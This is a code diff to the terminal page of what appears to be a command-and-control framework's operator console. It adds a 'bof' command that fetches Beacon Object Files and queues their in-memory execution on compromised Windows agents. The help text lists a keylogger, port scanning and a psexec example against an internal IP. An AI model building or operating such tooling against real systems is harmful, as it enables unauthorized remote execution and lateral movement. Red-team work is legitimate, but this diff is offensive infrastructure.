@@ -7,6 +7,8 @@ import { useOpsecStore } from "../stores/opsecStore";
 import { useTaskResultStore } from "../stores/taskResultStore";
 import { useTerminalStore } from "../stores/terminalStore";
 import { taskService } from "../services/taskService";
+import { payloadService } from "../services/payloadService";
+import { packBOFArgs, uint8ToBase64 } from "../services/bofPacker";
 import { Terminal, ChevronRight, ShieldAlert } from "lucide-react";
 
 export default function TerminalPage() {
@@ -68,6 +70,62 @@ export default function TerminalPage() {
     scrollRef.current?.scrollTo(0, scrollRef.current.scrollHeight);
   }, [history]);
 
+  const executeBOFCommand = async (parts: string[]) => {
+    if (!selectedAgent) return;
+    const bofNameOrB64 = parts[1];
+    if (!bofNameOrB64) {
+      addLine("error", "Usage: bof <name> [arg1] [arg2] ...\n  Args: prefix with i: s: z: Z: b: for type (default: wide string)\n  Example: bof psexec Z:192.168.1.5 Z:svcname Z:cmd.exe");
+      return;
+    }
+
+    if (!selectedAgent.os.toLowerCase().includes("windows")) {
+      addLine("error", "BOF execution is only supported on Windows agents. The POSIX agent has no COFF loader.");
+      return;
+    }
+
+    const looksLikeName = bofNameOrB64.length < 100 && !/[+/=]/.test(bofNameOrB64);
+
+    if (looksLikeName) {
+      try {
+        addLine("info", `[bof] Resolving '${bofNameOrB64}'...`);
+        const bofList = await payloadService.listBOFs();
+        const match = bofList.find(
+          (b) =>
+            b.name.replace(/\.(o|obj|coff)$/i, "").toLowerCase() === bofNameOrB64.toLowerCase() ||
+            b.name.toLowerCase() === bofNameOrB64.toLowerCase()
+        );
+        if (!match) {
+          addLine("error", `BOF '${bofNameOrB64}' not found. Upload it via the Modules page first.`);
+          if (bofList.length > 0) {
+            addLine("info", `Available: ${bofList.map((b) => b.name.replace(/\.(o|obj|coff)$/i, "")).join(", ")}`);
+          }
+          return;
+        }
+
+        addLine("info", `[bof] Fetching ${match.name} (${match.id.slice(0, 8)})...`);
+        const { data: bofB64 } = await payloadService.getBOFData(match.id);
+
+        const userArgs = parts.slice(2);
+        let finalArgs = bofB64;
+        if (userArgs.length > 0) {
+          const packed = packBOFArgs(userArgs);
+          finalArgs = `${bofB64} ${uint8ToBase64(packed)}`;
+          addLine("info", `[bof] Packed ${userArgs.length} arg(s) (${packed.length} bytes)`);
+        }
+
+        const task = await taskService.create(selectedAgent.id, "bof", finalArgs);
+        addLine("info", `[bof] Executing ${match.name} → Task ${task.id.slice(0, 8)}`);
+      } catch (err: any) {
+        addLine("error", `BOF execution failed: ${err.message}`);
+      }
+      return;
+    }
+
+    const rawArgs = parts.slice(1).join(" ");
+    const task = await taskService.create(selectedAgent.id, "bof", rawArgs || undefined);
+    addLine("info", `[queued] Task ${task.id.slice(0, 8)} -> ${selectedAgent.hostname}`);
+  };
+
   const executeCommand = async (cmd: string) => {
     if (!selectedAgent) {
       addLine("error", "No agent selected. Use 'use <id>' or select from Agents tab.");
@@ -85,6 +143,12 @@ export default function TerminalPage() {
     try {
       const parts = cmd.split(" ");
       const command = parts[0];
+
+      if (command === "bof") {
+        await executeBOFCommand(parts);
+        return;
+      }
+
       const args = parts.slice(1).join(" ");
       const task = await taskService.create(selectedAgent.id, command, args || undefined);
       addLine("info", `[queued] Task ${task.id.slice(0, 8)} -> ${selectedAgent.hostname}`);
@@ -144,8 +208,11 @@ export default function TerminalPage() {
         "  keylogger <start|stop|dump>  Keyboard logger (Windows)",
         "  portscan <ip/cidr> <ports>   TCP port scanner",
         "",
-        "BOF (Beacon Object Files):",
-        "  bof <name> [args]     Execute uploaded BOF in-memory",
+        "BOF (Beacon Object Files) — Windows only:",
+        "  bof <name> [args]     Auto-resolve, fetch & execute BOF",
+        "                        Args default to wide strings (Z:)",
+        "                        Prefixes: i: int, s: short, z: str, b: blob",
+        "                        Example: bof netview Z:192.168.1.5",
         "",
         "OPSEC warnings appear for risky commands.",
         "MITRE ATT&CK mappings are tracked automatically.",
